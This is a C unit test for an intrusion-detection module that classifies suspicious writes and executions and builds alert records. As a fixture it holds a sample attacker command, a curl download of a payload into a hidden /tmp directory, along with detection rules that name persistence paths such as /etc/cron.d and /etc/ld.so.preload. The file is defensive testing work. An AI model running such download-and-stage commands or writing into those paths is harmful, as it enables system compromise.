#include "provenance.h"
#include <assert.h>
#include <string.h>
#include <stdio.h>
#include <sys/stat.h>

int main(void) {
    struct ps_prov_cfg cfg = {
        .enabled = 1,
        .transient_paths = "/tmp,/var/tmp,/dev/shm,/run,/home",
        .sensitive_paths = "/etc/cron.d,/etc/systemd/system,/etc/ld.so.preload",
    };
    unsigned int X = S_IXUSR;   /* executable bit */

    /* executable write under a transient root -> write_executable */
    assert(strcmp(ps_provenance_classify("write", "/tmp/.x/payload", X, &cfg), "write_executable") == 0);
    /* non-executable write under a transient root -> not a trigger */
    assert(strcmp(ps_provenance_classify("write", "/tmp/notes.txt", 0, &cfg), "") == 0);
    /* executable write under a package root -> not a trigger (legit install) */
    assert(strcmp(ps_provenance_classify("write", "/usr/bin/ls", X, &cfg), "") == 0);
    /* write into a sensitive path -> write_sensitive_path (mode irrelevant) */
    assert(strcmp(ps_provenance_classify("write", "/etc/cron.d/evil", 0, &cfg), "write_sensitive_path") == 0);
    /* exec from a transient root -> exec_from_transient */
    assert(strcmp(ps_provenance_classify("exec", "/dev/shm/impl", 0, &cfg), "exec_from_transient") == 0);
    /* exec from a normal root -> not a trigger */
    assert(strcmp(ps_provenance_classify("exec", "/usr/sbin/sshd", 0, &cfg), "") == 0);
    /* prefix-boundary: "/tmpfoo" is NOT under "/tmp" */
    assert(strcmp(ps_provenance_classify("exec", "/tmpfoo/x", 0, &cfg), "") == 0);
    /* disabled cfg -> never triggers */
    struct ps_prov_cfg off = cfg; off.enabled = 0;
    assert(strcmp(ps_provenance_classify("write", "/tmp/.x/payload", X, &off), "") == 0);
    /* read/open events are never triggers */
    assert(strcmp(ps_provenance_classify("open", "/tmp/.x/payload", X, &cfg), "") == 0);

    /* --- build_record: bundle carries writer/ancestry/sockets/session --- */
    struct ps_activity a; memset(&a, 0, sizeof a);
    snprintf(a.event, sizeof a.event, "exec");
    snprintf(a.path, sizeof a.path, "/tmp/.x/payload");
    a.proc.pid = 4242; a.proc.uid = 0; a.proc.start_time = 887412;
    snprintf(a.proc.exe, sizeof a.proc.exe, "/usr/bin/curl");
    snprintf(a.proc.cmdline, sizeof a.proc.cmdline, "curl -fsSL http://203.0.113.9/x -o /tmp/.x/payload");
    snprintf(a.proc.cgroup, sizeof a.proc.cgroup, "/system.slice/sshd.service");
    snprintf(a.proc.mac_label, sizeof a.proc.mac_label, "unconfined");
    a.nanc = 1; a.anc[0].pid = 900; a.anc[0].depth = 1; a.anc[0].start_time = 612;
    snprintf(a.anc[0].comm, 64, "sshd");
    /* writer's own outbound (depth 0) = the fetch source */
    a.nsock = 2;
    a.sock[0].owner_pid = 4242; a.sock[0].depth = 0;
    snprintf(a.sock[0].proto, 4, "tcp");
    snprintf(a.sock[0].laddr, 64, "10.0.0.5:55012");
    snprintf(a.sock[0].raddr, 64, "203.0.113.9:443");
    snprintf(a.sock[0].state, 16, "ESTABLISHED");
    /* ancestor-owned inbound session (depth 1) = the operator/attacker origin */
    a.sock[1].owner_pid = 900; a.sock[1].depth = 1;
    snprintf(a.sock[1].proto, 4, "tcp");
    snprintf(a.sock[1].laddr, 64, "10.0.0.5:22");
    snprintf(a.sock[1].raddr, 64, "198.51.100.10:40222");
    snprintf(a.sock[1].state, 16, "ESTABLISHED");

    char buf[4096];
    int n = ps_provenance_build_record(&a, "exec_from_transient", "web1", buf, sizeof buf);
    assert(n > 0);
    assert(strstr(buf, "\"trigger\":\"exec_from_transient\""));
    assert(strstr(buf, "\"severity\":\"medium\""));
    assert(strstr(buf, "\"path\":\"/tmp/.x/payload\""));
    assert(strstr(buf, "\"start_ticks\":887412"));
    assert(strstr(buf, "\"exe\":\"/usr/bin/curl\""));
    assert(strstr(buf, "\"raddr\":\"203.0.113.9:443\""));      /* fetch source present */
    assert(strstr(buf, "\"session_src_ip\":\"198.51.100.10\""));/* port stripped */
    assert(strstr(buf, "\"session_src_ip_confidence\":\"firm\""));
    assert(strstr(buf, "\"host\":\"web1\""));

    /* write_executable maps to severity high */
    char buf2[4096];
    assert(ps_provenance_build_record(&a, "write_executable", "web1", buf2, sizeof buf2) > 0);
    assert(strstr(buf2, "\"severity\":\"high\""));

    printf("test_provenance: OK\n");
    return 0;
}
